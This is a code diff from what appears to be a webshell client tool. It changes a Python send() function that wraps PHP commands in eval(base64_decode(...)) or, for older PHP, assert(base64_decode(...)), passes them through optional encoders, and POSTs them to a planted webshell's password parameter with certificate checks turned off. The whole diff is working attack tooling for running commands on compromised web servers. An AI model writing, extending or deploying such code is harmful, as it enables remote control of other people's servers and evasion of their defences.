@@ -62,11 +62,12 @@ def base64_encode(data: str):
     return b64encode(data.encode()).decode()
 
 
-def send(data: str, **extra_params):
+def send(data: str, raw: bool = False, **extra_params):
     def randstr():
         return ''.join(sample(ascii_letters + digits, 8))
     url = gget("url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell")
+    php_v7 = gget("webshell.v7", "webshell")
     password = gget("webshell.password", "webshell")
     raw_key = gget("webshell.method", "webshell")
     encode_functions = gget("webshell.encode_functions", "webshell")
@@ -76,12 +77,14 @@ def send(data: str, **extra_params):
         params_dict["data"] = {}
     head = randstr()
     tail = randstr()
-    data = f"""eval('error_reporting(0);print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
+    if not raw:
+        data = f"""eval('error_reporting(0);print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
+        if (not php_v7):
+            data = f"""assert(base64_decode("{base64_encode(data)}"));"""
     for func in encode_functions:
         if func in encode_pf:
             data = encode_pf[func].run(data)
     params_dict[raw_key][password] = data
-    print(params_dict)
     req = requests.post(url, verify=False, **params_dict)
     # req.encoding = req.apparent_encoding
     text = req.text
